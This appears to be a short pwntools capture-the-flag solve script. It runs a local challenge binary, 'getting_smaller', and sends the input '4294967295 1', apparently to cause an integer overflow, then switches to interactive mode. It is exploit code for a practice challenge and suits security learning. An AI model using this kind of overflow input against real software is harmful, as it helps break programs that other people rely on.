from pwn import *

r = process('./getting_smaller')

r.recvuntil(b'Enter your numbers: ')
r.sendline(b'4294967295 1')

r.interactive()